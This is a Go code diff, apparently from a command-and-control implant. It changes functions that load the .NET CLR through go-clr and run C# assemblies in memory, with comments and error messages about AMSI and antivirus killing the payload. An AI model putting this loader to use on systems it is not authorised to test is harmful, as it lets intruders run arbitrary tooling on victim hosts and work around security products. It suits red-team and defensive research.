@@ -4,12 +4,12 @@ import (
 	"bytes"
 	"compress/flate"
 	"crypto/sha256"
-	"errors"
 	"fmt"
 	clr "github.com/Ne0nd0g/go-clr"
 	"io"
 	"log"
 	"sync"
+	"time"
 )
 
 var (
@@ -32,11 +32,10 @@ func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
 	defer c.Unlock()
 
 	if c.runtimeHost == nil {
-		log.Printf("Initializing CLR runtime host")
 		c.runtimeHost, _ = clr.LoadCLR(runtime)
-
 		err := clr.RedirectStdoutStderr()
 		if err != nil {
+			// When running in an IDE, this will fail due no real console to redirect
 			log.Printf("could not redirect stdout/stderr: %v\n", err)
 		}
 	}
@@ -64,17 +63,13 @@ func LoadAssembly(data []byte, params []string, runtime string) (string, error) 
 	var methodInfo *clr.MethodInfo
 	var err error
 
+	// If this crashes, its likely due to AMSI killing it
 	rtHost := clrInstance.GetRuntimeHost(runtime)
-	if rtHost == nil {
-		return "", errors.New("could not load CLR runtime host")
-	}
-
 	if asm := getAssembly(data); asm != nil {
 		methodInfo = asm.methodInfo
 	} else {
 		methodInfo, err = clr.LoadAssembly(rtHost, data)
 		if err != nil {
-			log.Printf("could not load assembly: %v\n", err)
 			return "", err
 		}
 		addAssembly(methodInfo, data)
@@ -83,9 +78,9 @@ func LoadAssembly(data []byte, params []string, runtime string) (string, error) 
 	if len(params) == 1 && params[0] == "" {
 		params = []string{" "}
 	}
+
 	stdout, stderr := clr.InvokeAssembly(methodInfo, params)
 
-	// Will print result into terminal in a debugger because it requires a real console
 	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
 }
 
@@ -100,9 +95,14 @@ func Runcsharptask(data []byte, params []string) string {
 
 	versionString := "v4.0.30319"
 
+	err := clr.RedirectStdoutStderr()
+	if err != nil {
+		return fmt.Sprintf("Failed to redirect stdout/stderr: %v", err)
+	}
+
 	result, err := LoadAssembly(decompressedData, params, versionString)
 	if err != nil {
-		log.Fatalf("Error running assembly: %v", err)
+		return fmt.Sprintf("Failed to run assembly: %v\nLikely killed by antivirus", err)
 	}
 
 	return result
@@ -125,15 +125,15 @@ func RunCsharpTaskInBackground(data []byte, params []string, callback func(strin
 
 		versionString := "v4.0.30319"
 
-		// Run the assembly in the background
 		result, err := LoadAssembly(decompressedData, params, versionString)
+
+		time.Sleep(1 * time.Second)
+
 		if err != nil {
-			log.Printf("Error running assembly in background: %v", err)
-			callback("") // Send an empty string or error message if execution fails
+			callback(fmt.Sprintf("Failed to run assembly: %v\nLikely killed by antivirus", err))
 			return
 		}
 
-		// Call the callback function with the result when done
 		callback(result)
 	}()
 }
